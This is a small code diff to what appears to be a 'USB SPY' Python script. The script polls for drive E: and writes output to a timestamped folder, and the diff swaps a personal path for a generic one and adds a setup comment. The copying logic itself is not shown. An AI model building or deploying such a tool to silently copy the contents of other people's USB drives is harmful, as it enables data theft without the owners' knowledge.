@@ -17,8 +17,8 @@ SECONDS = get_seconds()
 
 TARGET = "E:"
 
-DESTINATION = f"C:/Users/Nave/Desktop/USB SPY/Output/{YEAR}-{MONTH}-{HOUR}-{MINUTES}-{SECONDS}"
-
+DESTINATION = f"C:/Users/someone/Desktop/Output_Folder/{YEAR}-{MONTH}-{HOUR}-{MINUTES}-{SECONDS}"
+#make sure to set up the destination to your choice. leave the year-month-hour-minutes-seconds if you want to make the folder look much better! :)
 
 while True:
     if (os.path.exists(TARGET)):
